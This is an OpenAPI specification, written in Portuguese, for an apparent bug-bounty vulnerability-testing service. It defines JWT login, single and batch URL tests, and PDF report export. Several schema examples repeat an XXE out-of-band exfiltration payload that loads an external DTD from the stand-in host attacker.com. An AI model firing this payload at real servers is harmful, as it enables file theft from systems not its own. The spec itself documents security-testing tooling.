openapi: 3.0.3
info:
  title: Bug Bounty API
  description: API para testes de vulnerabilidades em URLs, com suporte a autenticação JWT, testes individuais e em lote, e exportação de relatórios.
  version: 1.0.0
  contact:
    name: Suporte
    email: suporte@example.com
servers:
  - url: http://localhost:8080
    description: Servidor local de desenvolvimento
components:
  securitySchemes:
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT
  schemas:
    LoginRequest:
      type: object
      required:
        - username
        - password
      properties:
        username:
          type: string
          example: admin
        password:
          type: string
          example: password123
    LoginResponse:
      type: object
      properties:
        token:
          type: string
          example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
    ErrorResponse:
      type: object
      properties:
        error:
          type: string
          example: Credenciais inválidas
    VulnerabilityTestRequest:
      type: object
      required:
        - targetUrl
        - vulnerabilityType
      properties:
        targetUrl:
          type: string
          format: uri
          example: https://exemplo.com
        vulnerabilityType:
          type: string
          example: XXE with Out-of-Band Exfiltration
        payload:
          type: string
          example: <!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]><data>&exfil;</data>
    VulnerabilityTestResponse:
      type: object
      properties:
        id:
          type: string
          example: job123
        targetUrl:
          type: string
          example: https://exemplo.com
        vulnerabilityType:
          type: string
          example: XXE with Out-of-Band Exfiltration
        payload:
          type: string
          example: <!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]><data>&exfil;</data>
        status:
          type: string
          example: completed
    BatchVulnerabilityTestRequest:
      type: object
      required:
        - urls
      properties:
        urls:
          type: array
          items:
            type: object
            properties:
              targetUrl:
                type: string
                format: uri
                example: https://exemplo.com
              vulnerabilityType:
                type: string
                example: XXE with Out-of-Band Exfiltration
              payload:
                type: string
                example: <!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]><data>&exfil;</data>
    BatchVulnerabilityTestResponse:
      type: object
      properties:
        id:
          type: string
          example: batchJob123
        results:
          type: array
          items:
            type: object
            properties:
              targetUrl:
                type: string
                example: https://exemplo.com
              status:
                type: string
                example: completed
    Job:
      type: object
      properties:
        id:
          type: string
          example: job123
        targetUrl:
          type: string
          example: https://exemplo.com
        status:
          type: string
          example: completed
        reportPath:
          type: string
          example: /reports/job123.pdf
paths:
  /api/health:
    get:
      summary: Verifica a saúde do servidor
      description: Retorna o status do servidor para confirmar que está ativo.
      responses:
        '200':
          description: Servidor está ativo
          content:
            application/json:
              schema:
                type: object
                properties:
                  status:
                    type: string
                    example: ok
  /api/auth/login:
    post:
      summary: Autentica um usuário
      description: Autentica um usuário com nome de usuário e senha, retornando um token JWT.
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/LoginRequest'
      responses:
        '200':
          description: Login bem-sucedido
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/LoginResponse'
        '401':
          description: Credenciais inválidas
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
  /api/vulnerabilities/test:
    post:
      summary: Testa uma vulnerabilidade em uma URL
      description: Executa um teste de vulnerabilidade em uma única URL com um tipo de exploit e payload opcional.
      security:
        - BearerAuth: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/VulnerabilityTestRequest'
      responses:
        '200':
          description: Teste concluído
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/VulnerabilityTestResponse'
        '401':
          description: Token inválido ou não fornecido
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '400':
          description: Dados inválidos
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
  /api/vulnerabilities/test/batch:
    post:
      summary: Testa vulnerabilidades em múltiplas URLs
      description: Executa testes de vulnerabilidade em uma lista de URLs.
      security:
        - BearerAuth: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/BatchVulnerabilityTestRequest'
      responses:
        '200':
          description: Teste em lote concluído
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/BatchVulnerabilityTestResponse'
        '401':
          description: Token inválido ou não fornecido
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '400':
          description: Dados inválidos
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
  /api/vulnerabilities/export/{jobId}:
    get:
      summary: Exporta um relatório de teste
      description: Baixa um relatório em PDF para um job específico.
      security:
        - BearerAuth: []
      parameters:
        - in: path
          name: jobId
          required: true
          schema:
            type: string
            example: job123
          description: ID do job a ser exportado
      responses:
        '200':
          description: Relatório baixado com sucesso
          content:
            application/pdf:
              schema:
                type: string
                format: binary
        '401':
          description: Token inválido ou não fornecido
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '404':
          description: Job não encontrado
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'